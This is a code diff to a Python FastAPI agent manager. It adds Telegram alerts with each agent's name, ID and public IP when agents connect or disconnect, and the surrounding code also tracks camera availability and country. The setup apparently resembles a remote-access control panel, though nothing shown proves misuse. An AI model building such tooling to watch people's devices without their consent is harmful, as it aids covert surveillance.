@@ -1,5 +1,6 @@
 import json
 from typing import Dict, Any, List, Set
+from telegram_notify import send_telegram
 from fastapi import WebSocket
 import asyncio
 import aiofiles
@@ -67,6 +68,7 @@ class AgentManager:
     async def register_agent(self, agent_id: str, name: str, http_base: str, ws: WebSocket, has_camera: bool = False, country: str | None = None, country_code: str | None = None, public_ip: str | None = None) -> None:
         async with self._lock:
             prev = self.agents.get(agent_id, {})
+            was_online = bool(prev.get("socket"))
             self.agents[agent_id] = {
                 "socket": ws,
                 "name": name or prev.get("name") or agent_id,
@@ -79,6 +81,16 @@ class AgentManager:
             }
         await self.persist_agents()
         await self.broadcast_agents()
+        # Notify on first online transition
+        try:
+            if not was_online:
+                alias = self.agents.get(agent_id, {}).get("alias")
+                nm = alias or name or agent_id
+                ip = public_ip or self.agents.get(agent_id, {}).get("public_ip")
+                msg = f"\u2705 <b>Agent online</b>\nName: <code>{nm}</code>\nID: <code>{agent_id}</code>\nIP: <code>{ip or 'unknown'}</code>"
+                await send_telegram(msg)
+        except Exception:
+            pass
 
     async def remove_agent(self, agent_id: str) -> None:
         # Backwards-compat: full removal (used by explicit clear)
@@ -89,14 +101,21 @@ class AgentManager:
         await self.broadcast_agents()
 
     async def mark_offline(self, agent_id: str) -> None:
+        name = None
         async with self._lock:
             if agent_id in self.agents:
                 try:
+                    name = self.agents[agent_id].get("alias") or self.agents[agent_id].get("name")
                     self.agents[agent_id]["socket"] = None
                 except Exception:
                     self.agents[agent_id] = {k: v for k, v in self.agents[agent_id].items() if k != "socket"}
         await self.persist_agents()
         await self.broadcast_agents()
+        try:
+            nm = name or agent_id
+            await send_telegram(f"\u26D4\ufe0f <b>Agent offline</b>\nName: <code>{nm}</code>\nID: <code>{agent_id}</code>")
+        except Exception:
+            pass
 
     async def clear_agent(self, agent_id: str) -> None:
         await self.remove_agent(agent_id)
